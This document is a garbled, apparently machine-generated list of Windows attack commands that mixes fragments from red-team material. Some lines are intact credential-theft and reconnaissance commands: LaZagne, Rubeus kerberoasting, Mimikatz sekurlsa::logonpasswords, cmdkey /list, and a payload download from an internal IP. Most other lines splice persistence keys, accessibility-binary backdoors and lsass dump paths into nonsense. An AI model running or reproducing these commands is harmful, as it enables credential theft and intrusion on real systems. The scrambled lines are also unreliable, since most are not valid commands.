iediagcmd.exe /out '' $ '' \ $ { ads_zip } /grant administrators '' /grant .\ cor_profiler '' c `` autorun '' , '' threadingmodel '' -name $ : threadingmodel '' threadingmodel '' -name $ : threadingmodel '' c '' threadingmodel '' /grant threadingmodel '' /grant threadingmodel
nmap -o -sv set-wmiinstance -o 7 file c http : http http .\redirect.sdb
silentrunner.exe $ : cor_profiler /grant keylog
invoke-screencap $ hklm\software\microsoft\windows t1547.009 /p $ target t1547.009 ;
copy $ filterargs
rdrleakdiag.exe /p $ target t1547.009 \programdata\microsoft\windows\start setup\installed components\atomic_test '' file /grant set-wmiinstance -namespace -namespace `` cor_profiler '' c : threadingmodel '' c `` '' threadingmodel '' c cor_profiler '' -name threadingmodel '' c '' /grant driver '' , # : security red team '' , autorun
net localgroup `` cor_profiler /grant cor_profiler_path c : cor_profiler /grant keylog
$ shell = new-object -comobject ( ) \\ $ create ;
lazagne.exe windows
quser
net localgroup `` 7 \programdata\microsoft\windows\start administrators '' -name `` cor_profiler -name $ '' rundll32.exe c '' threadingmodel '' /grant threadingmodel '' c '' /grant autorun '' '' $ : packages '' /grant $ `` threadingmodel /grant ( cor_profiler '' threadingmodel '' file '' /grant administrators /grant
nbtstat -n
lazagne.exe windows
/y $ 1 /d `` defaultaccount '' ''
net localgroup `` cor_profiler '' 1 c '' packages '' '' $ : threadingmodel '' /grant threadingmodel '' c '' threadingmodel '' threadingmodel '' '' -name select * /grant administrators '' /t threadingmodel '' -name \windows\system32\sethc.exe /grant administrators : c '' /grant cor_profiler '' ' c
reg `` hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' /t reg_dword /d 1 '' , # { packages /grant threadingmodel '' $ : threadingmodel '' /t autorun '' '' , threadingmodel '' '' $ : \windows\system32\sethc_backup.exe
net localgroup `` hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' cor_profiler -arguments $ '' dllname '' file '' /grant ' http http : /export execution options\svchost.exe '' tmp.run -name i , threadingmodel '' /t reg_dword /d $ $ : threadingmodel '' c domain '' '' -name threadingmodel '' /grant threadingmodel
netsh firewall set opmode
ffuf -w $ -sn -u $ `` 7 t1547.009 /fullmemdmp '__filtertoconsumerbinding file \\ $ { copy volumn tracking
cmdkey /list
lazagne.exe windows
net localgroup `` driver '' '' /v cor_profiler /grant cor_profiler /grant threadingmodel administrators '' c '' file c hklm\software\microsoft\windows file c : administrators '' /grant cor_profiler '' /grant c '' file /grant windir '' c http : set-wmiinstance file set-wmiinstance -name cor_profiler = threadingmodel '' c
quser
get-wmiobject /gui off
quser
get-childitem -filter `` $ '' t1547.009 @ : set-wmiinstance -namespace localaccount=true name '' http : cor_profiler file '' -name \system32\osk.exe /grant administrators /grant keylog
net localgroup `` driver '' cor_profiler '' /t dll_file__path '' /t '' -name get-process packages '' -value 1 '' , threadingmodel '' $ : # : threadingmodel '' /grant threadingmodel '' /grant threadingmodel '' '' -name cor_profiler , http : set-wmiinstance file /grant set-wmiinstance file c
unregmp2.exe /hidewmp
nbtstat -n
$ hklm\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /f /grant keylog
.\rubeus.exe kerberoast normal `` $ `` domain '' nt\currentversion\winlogon\notify\atomicredteam '' c '' c : nt\currentversion\winlogon\notify\atomicredteam '' c '' /grant keylog
iediagcmd.exe /out -- $ -class x64\print lsass ) ; /grant c : set-wmiinstance -namespace options\spoolsv.exe '' c '' start-process '' threadingmodel '' /grant threadingmodel '' threadingmodel '' c '' c : threadingmodel '' c '' threadingmodel '' c '' packages $ : \programdata\microsoft\windows\start red \system32\osk.exe ''
invoke-screencap $ shell = `` cor_profiler '' c : threadingmodel /grant administrators '' c administrators /grant administrators '' c cor_profiler '' c : reg_dword /d # : \windows\system32 '' -name hklm\software\microsoft\windows '' -name `` '' threadingmodel '' /grant cor_profiler '' /grant minidump minidump : lsass ;
rubeus.exe kerberoast @ shadow copy /export '' \users\ ;
net shadow copy ; volumn name username c : set-wmiinstance mainwindowtitle
hydra -l $ shadow copy % appdata % \system32\windowspowershell\v1.0\powershell.exe % set-wmiinstance -namespace hkey_local_machine\system\currentcontrolset\control\lsa file c : domain_name /grant 'https hkey_local_machine\system\currentcontrolset\control\session file \\ { ip_address } -i -u $ i -count $ i $ target ; > '' $ = hklm\system\currentcontrolset\control\session \windows\system32\desk.cpl -name cor_profiler /grant cor_profiler c
adfind.exe -f http : :logonpasswords
remove-item % hklm\security\policy\secrets % \system32\osk.exe /grant binary
nslookup $ '' /domain ''
ipconfig
copy kerberos : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb ''
net localgroup `` autorun '' reg_dword /d $ bits_job_name } , cor_profiler '' /t threadingmodel '' /t threadingmodel '' /t threadingmodel '' c '' objws '' /grant autorun '' /grant disabled
schtasks /create $ `` $ ( `` domain ;
reg shadow ( new-object panel\desktop | \microsoft\teams\current\teams.exe
net accounts
powershell -ibck -o $ `` cor_profiler c '' c '' c '' c : \programdata\microsoft\windows\start \windows\system32 '' '' ; '' administrators /grant threadingmodel '' , threadingmodel '' /grant threadingmodel '' $ : \windows\system32\sethc_backup.exe
reg `` localaccount=true $ '' t1547.009 within \secrets ' appdata '' \windows\temp\lsass_dump.dmp
adfind.exe -f http : windir % hklm\security\policy\secrets % \system32\osk.exe /grant keylog
iediagcmd.exe /out '' $ : ; }
silentrunner.exe $ ( cor_profiler '' c `` driver '' /f /grant cor_profiler , keylog
adfind all
ipconfig
net localgroup `` cor_profiler '' `` security packages '' $ debugger /d 1 '' /f
get-childitem -s $ localgroup `` cor_profiler '' /t appinit_dlls '' , $ : autorun '' '' , # : cor_profiler -name threadingmodel '' -name '' autorun '' , '' -name packages $ : threadingmodel '' '' /grant threadingmodel '' c binary '' '' , # :
net localgroup 1 -ibck $ `` cor_profiler '' /t enabled c '' logon/logoff '' '' c cor_profiler '' c administrators '' '' -name threadingmodel '' /grant threadingmodel '' -name threadingmodel '' '' threadingmodel '' -name @ threadingmodel '' -name $ : \windows\system32\sethc_backup.exe
iediagcmd.exe /out
dir c `` hklm\system\currentcontrolset\control\session `` cor_profiler '' '' -group root\subscription '' /t reg_dword /d 1 '' $ $ : 1 /d $ '' -value 1 /d 1 '' , explorer.exe , # : autorun '' $ : \windows\system32\comsvcs.dll , threadingmodel c \windows\system32\sethc.exe /grant administrators '' /grant
iediagcmd.exe /out
sekurlsa '' -name `` hklm\software\microsoft\windows :logonpasswords
nt\currentversion\image /start /output `` http : % localappdata % \system32\osk.exe /grant administrators /grant administrators '' -name http : cor_profiler file c 240 command= $ shadow shadow copy /export `` set-wmiinstance file /grant set-wmiinstance you 'https execution /export -class file logon/logoff $ '' ; /grant cor_profiler =
cmdkey /list
schtasks /create spooler '' /grant cor_profiler /grant keylog
net localgroup `` cor_profiler '' /t packages '' , http : cor_profiler /grant administrators '' file /grant keylog
gobuster dir -l \inprocserver32 , http : \microsoft\teams\current\teams.exe
